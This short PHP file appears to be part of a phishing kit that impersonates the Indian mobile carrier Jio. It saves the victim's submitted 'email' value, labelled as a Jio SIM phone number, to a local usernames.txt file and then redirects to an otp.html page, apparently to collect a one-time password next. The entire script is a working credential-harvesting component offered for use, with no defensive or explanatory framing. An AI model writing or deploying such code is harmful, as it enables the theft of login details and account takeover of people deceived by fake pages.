<?php

file_put_contents("usernames.txt", "Jio Sim Phone number : " . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>
